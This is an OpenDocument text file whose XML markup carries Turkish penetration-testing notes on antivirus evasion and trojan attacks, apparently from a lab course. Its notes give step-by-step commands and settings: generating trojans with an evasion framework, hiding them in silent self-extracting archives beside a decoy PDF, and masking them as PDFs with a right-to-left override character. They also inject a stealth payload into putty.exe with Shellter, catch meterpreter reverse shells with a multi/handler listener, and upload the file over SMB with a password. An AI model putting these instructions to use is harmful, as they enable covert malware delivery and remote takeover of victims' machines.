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2da69e" officeooo:paragraph-rsid="001f4b11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315f80" officeooo:paragraph-rsid="00315f80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22bfc" officeooo:paragraph-rsid="00322bfc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3445d4" officeooo:paragraph-rsid="003445d4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35f797" officeooo:paragraph-rsid="0035f797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364934" officeooo:paragraph-rsid="00364934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3696b5" officeooo:paragraph-rsid="003696b5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3898c0" officeooo:paragraph-rsid="003898c0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3a0cb4" officeooo:paragraph-rsid="003a0cb4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000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003b1961" officeooo:paragraph-rsid="003b1961" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P14" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003b71fa" officeooo:paragraph-rsid="003b71fa" style:font-size-asian="10.5pt" style:font-weight-asian="normal" style:font-size-complex="10.5pt" style:font-weight-complex="normal"/>
    </style:style>
    <style:style style:name="P15" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003cab29" officeooo:paragraph-rsid="003cab29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fo:color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003d4cd8" officeooo:paragraph-rsid="003d4cd8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color="#000000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="10.5pt" fo:font-weight="normal" officeooo:rsid="003e2ff3" officeooo:paragraph-rsid="003e2ff3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color="#127622" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="14pt" fo:font-weight="bold" officeooo:rsid="0030f84e" officeooo:paragraph-rsid="0030f84e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ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0030f84e" officeooo:paragraph-rsid="0030f84e" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P20" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0030f84e" officeooo:paragraph-rsid="003264db" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P21" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0035d906" officeooo:paragraph-rsid="0035d906" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P22" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0035d906" officeooo:paragraph-rsid="0035f797" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P23" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0035d906" officeooo:paragraph-rsid="00364934" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P24" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0035d906" officeooo:paragraph-rsid="003696b5" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P25" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0035d906" officeooo:paragraph-rsid="003898c0" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P26" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="0035d906" officeooo:paragraph-rsid="003d1bd5" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P27" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003d4cd8" officeooo:paragraph-rsid="003d4cd8" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="P28" style:family="paragraph" style:parent-style-name="Preformatted_20_Text">
      <style:text-properties fo:color="#ff0000" loext:opacity="100%" style:font-name="Liberation Mono" fo:font-size="12pt" fo:font-weight="bold" officeooo:rsid="003e2ff3" officeooo:paragraph-rsid="001d27fe" style:font-size-asian="10.5pt" style:font-weight-asian="bold" style:font-size-complex="12pt" style:font-weight-complex="bold"/>
    </style:style>
    <style:style style:name="T1" style:family="text">
      <style:text-properties officeooo:rsid="003264db"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="003445d4"/>
    </style:style>
    <style:style style:name="T3" style:family="text">
      <style:text-properties officeooo:rsid="0035f797"/>
    </style:style>
    <style:style style:name="T4" style:family="text">
      <style:text-properties officeooo:rsid="00364934"/>
    </style:style>
    <style:style style:name="T5" style:family="text">
      <style:text-properties officeooo:rsid="003696b5"/>
    </style:style>
    <style:style style:name="T6" style:family="text">
      <style:text-properties officeooo:rsid="003898c0"/>
    </style:style>
    <style:style style:name="T7" style:family="text">
      <style:text-properties officeooo:rsid="003d1b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3.ANTİVİRÜS ATLATMALARI VE TROJAN SALDIRILARI</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P19">Trojan Hazırlama</text:p>
      <text:p text:style-name="P5">list yapıp trojanları gördük</text:p>
      <text:p text:style-name="P5">use 39</text:p>
      <text:p text:style-name="P5">bilinen değerlerin dışına çıkmak daha faydalıdır.</text:p>
      <text:p text:style-name="P5">Amacımız firewall da kullanılan hash veya md5 kodlarına uygun bi kod verebilmek. Böylece atlatmak daha kolay olacaktır.</text:p>
      <text:p text:style-name="P5">Set domain <text:s/>sirket.local</text:p>
      <text:p text:style-name="P5">set lhost <text:s/>10.10.10.80</text:p>
      <text:p text:style-name="P5">set lport <text:s/>5566</text:p>
      <text:p text:style-name="P5">set sleep <text:s/>12</text:p>
      <text:p text:style-name="P5">set username <text:s/>a.bilgi</text:p>
      <text:p text:style-name="P5">set hostname <text:s/>bilgiislem-pc</text:p>
      <text:p text:style-name="P5">generate</text:p>
      <text:p text:style-name="P5">test.exe adında trojan oluşturduk..</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5">use 11</text:p>
      <text:p text:style-name="P5">set hostname bilgiislem-pc</text:p>
      <text:p text:style-name="P4">set lhost 10.10.10.80</text:p>
      <text:p text:style-name="P4">set lport 5567</text:p>
      <text:p text:style-name="P6">set sleep 12</text:p>
      <text:p text:style-name="P6">set username a.bilgi</text:p>
      <text:p text:style-name="P4">set use_arya Y</text:p>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P4"/>
      <text:p text:style-name="P20">Trojan<text:span text:style-name="T1">ları Online Test Etme ve No Distribute hk.</text:span></text:p>
      <text:p text:style-name="P7">Antiscan.me <text:s/>(en uygun site)</text:p>
      <text:p text:style-name="P4">md5sum test.exe <text:s/><text:span text:style-name="T2">(md5 hash ini kendimiz öğrenebiliriz)</text:span></text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P21">Embed (gömülü) File Hazırlama</text:p>
      <text:p text:style-name="P8">firefox açıldığı anda yanında başka bir uygulama açılmasını istiyoruz.</text:p>
      <text:p text:style-name="P8">Putty.exe yi kendi bilgisayarımıza indiriyoruz.</text:p>
      <text:p text:style-name="P8">Kullanacağımız 2 dosyayı seçip arşive ekle diyoruz.</text:p>
      <text:p text:style-name="P8">Arşiv ayarlarını şöyle yapacağız.</text:p>
      <text:p text:style-name="P8">SFX Archive <text:s/>var</text:p>
      <text:p text:style-name="P8">SFX Options <text:s/><text:a xlink:type="simple" xlink:href="../../../../c:/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">c:\</text:a> <text:s/>altına</text:p>
      <text:p text:style-name="P8">setup <text:s/>putty.exe ve manual.txt</text:p>
      <text:p text:style-name="P8">modes <text:s/>silent mode <text:s/>hideall</text:p>
      <text:p text:style-name="P8">update overwrite mode <text:s/>overwrite all files</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P22">Embed <text:span text:style-name="T3">Trojan Hazırlama</text:span></text:p>
      <text:p text:style-name="P9">2 Trojan göndereceğiz. 1Ini yem olarak yutacak, diğerini çalıştıracağız.</text:p>
      <text:p text:style-name="P9">Bir PDF üzerinden girmeye çalışacağız.</text:p>
      <text:p text:style-name="P9">Önce pdf sonra 2 trojanımzı çalıştıracağız.</text:p>
      <text:p text:style-name="P9">Icon olarak pdf icosu bulduk</text:p>
      <text:p text:style-name="P9">yerleştireceğimiz dosya dizini belirlemedik..</text:p>
      <text:p text:style-name="P9">mod dan geçici dizine gönderdik.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"/>
      <text:p text:style-name="P23"><text:soft-page-break/><text:span text:style-name="T3">Trojan </text:span><text:span text:style-name="T4">a RTLO (U+202E) Uygulama</text:span></text:p>
      <text:p text:style-name="P10">Karakter Eşlemden U+202E yi seçip pdf.exe yerini değiştirtiyoruz..</text:p>
      <text:p text:style-name="P10">pdf görünümlü exemiz hazır.</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P24"><text:bookmark-start text:name="__DdeLink__375_1543861488"/><text:span text:style-name="T3">T</text:span><text:span text:style-name="T5">rend Micro lu Win10 da Test</text:span><text:bookmark-end text:name="__DdeLink__375_1543861488"/></text:p>
      <text:p text:style-name="P11">Multihandler ile port dinlemeye başlıyoruz.</text:p>
      <text:p text:style-name="P11">Payload windows/meterpreter/reverse_tcp</text:p>
      <text:p text:style-name="P11">portumuzu 5566 ve 5567 olarak 2 kez dinlemeye bırakıyoruz.</text:p>
      <text:p text:style-name="P11">Run -j <text:s/>ile</text:p>
      <text:p text:style-name="P11">Hazırladığımız trojanı atıyoruz.</text:p>
      <text:p text:style-name="P11">Içerdeyiz..</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P25"><text:span text:style-name="T6">Otomatik </text:span>Embed <text:span text:style-name="T3">Trojan Hazırlama</text:span></text:p>
      <text:p text:style-name="P3">/usr/share/windows-resources/shellter</text:p>
      <text:p text:style-name="P12">wine shellter.exe</text:p>
      <text:p text:style-name="P13">32 bit ve ufak olan putty.exe yi tercih ediyoruz.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P14">Operation mode: A</text:p>
      <text:p text:style-name="P14">PE Target: putty.exe yi koyuyoruz.</text:p>
      <text:p text:style-name="P15">Stealth mode: y</text:p>
      <text:p text:style-name="P15">payload 1</text:p>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P15"/>
      <text:p text:style-name="P26"><text:span text:style-name="T3">T</text:span><text:span text:style-name="T5">rend Micro lu Win10 da Test </text:span><text:span text:style-name="T7">2</text:span></text:p>
      <text:p text:style-name="P16">putty.exe yi karşıya gönderip msfconsole dan dinliyoruz</text:p>
      <text:p text:style-name="P16">use exploit/multi/handler</text:p>
      <text:p text:style-name="P16">payloadımızaynı windows/meterpreter/</text:p>
      <text:p text:style-name="P16">set lhost 10.10.10.80</text:p>
      <text:p text:style-name="P16">set lport 5588</text:p>
      <text:p text:style-name="P16">run.. <text:s/>exe çalıştığında meterpreter alırız..</text:p>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P16"/>
      <text:p text:style-name="P27">Antivirüs Modları ve Davranışları Hakkında</text:p>
      <text:p text:style-name="P16">SMB HTTP gibi iletişim protokolleri sıkı denetim içindedir.</text:p>
      <text:p text:style-name="P16">smbmap -d sirket.local -u f.yoneten -p 'Password!!' -H 10.10.10.35 --upload '/root/Desktop/putty.exe' 'Development\putty.exe'</text:p>
      <text:p text:style-name="P17">rar a şifre koyarak antivirüs de atlatılabilir. <text:s/>(crack)</text:p>
      <text:p text:style-name="P17"/>
      <text:p text:style-name="P28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3T13:24:14.412861671</dc:date>
    <meta:editing-duration>PT5H26M11S</meta:editing-duration>
    <meta:editing-cycles>38</meta:editing-cycles>
    <meta:generator>LibreOffice/7.4.1.1$Linux_X86_64 LibreOffice_project/40$Build-1</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="2" meta:paragraph-count="70" meta:word-count="323" meta:character-count="2382" meta:non-whitespace-character-count="2112"/>
  </office:meta>
</office:document-meta>
</file>